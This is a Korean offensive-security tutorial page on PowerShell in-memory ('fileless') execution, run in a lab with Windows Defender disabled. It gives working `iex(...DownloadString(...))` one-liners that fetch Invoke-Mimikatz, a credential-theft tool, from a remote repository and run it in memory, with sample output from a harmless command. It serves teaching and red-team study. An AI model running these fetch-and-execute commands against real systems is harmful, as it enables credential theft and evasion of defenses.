# 인메모리 실행

파워쉘 공격의 가장 큰 장점 중 하나는 바로 메모리상에서 파워쉘 코드를 실행시킬 수 있다는 것이다. 인메모리 실행 (In-Memory Execution)이라고도 불리고, 2010년대 중반에는 "Fileless Attack" 공격으로도 불렸었다. 말 그대로 디스크에 파일이 없이 공격이 가능하다는 것이다. 이것이 가능한 이유는 파워쉘이 인터프리티드 언어 (Interpreted Language) 이기 때문이다. 파워쉘 코드를 `powershell.exe` 프로세스에서 실행할 경우 백엔드의 인터프리터가 코드 한 줄 한 줄을 메모리상에서 실행 시킨다.&#x20;

인메모리 실행을 할 경우 디스크에 악성 파일이 남지 않고, 정적 분석이 아닌 메모리분석을 해야하기 때문에 방어 우회를 하기가 조금 더 편하다 - 편했었다. 2022년도 기준에는 파워쉘 로깅 및 보안이 워낙 더 탄탄하기 때문에 오히려 인메모리 파워쉘 실행이 더 어렵기도 하다.&#x20;

### 실습&#x20;

실습에서는 윈도우 디펜더를 끈 상태에서 진행한다. 추후 윈도우 디펜더 및 AMSI를 우회하는 방법에 대해서는 [AMSI 우회 페이지](../../defense-evasion/amsi-bypass.md)에 따로 서술한다.&#x20;

인메모리 실행은 다른 호스트에 있는 파워쉘을 다운로드 받은 뒤 로드 (Load) 시키는 형태로 이뤄진다.&#x20;

```powershell
# 원격 파워쉘 다운 후 불러오기 
iex(new-object net.webclient).downloadstring("<url>");

# 예시 - BCSecurity의 empire 프로젝트에서 Invoke-Mimikatz.ps1 다운 + 불러오기 
 iex(New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`(new-object net.webclient).downloadstring("<url>")` 를 통해 원격의 파워쉘 코드를 다운 받은 뒤, `iex` 로 다운 받은 파워쉘 코드를 실행 (Invoke-Expression) 하는 것이다. 이렇게 되면 현 파워쉘 프로세스에 원격 파워쉘 코드를 불러온 상태가 된다. 이 상태에서 불러온 파워쉘을 실행시키면 실행 결과가 나온다.&#x20;

```powershell
PS C:\> Invoke-Mimikatz -Command "coffee"
Hostname: DESKTOP-71L41J7 / S-1-5-21-462821047-2831688090-1286352653

  .#####.   mimikatz 2.2.0 (x64) #19041 Nov 20 2021 08:28:06
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # coffee

    ( (
     ) )
  .______.
  |      |]
  \      /
   `----'
```

이를 한번에 묶어 다운로드 + 불러오기 + 실행을 한꺼번에 할 수도 있다.&#x20;

```powershell
iex(New-Object net.webclient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command "coffee"
```

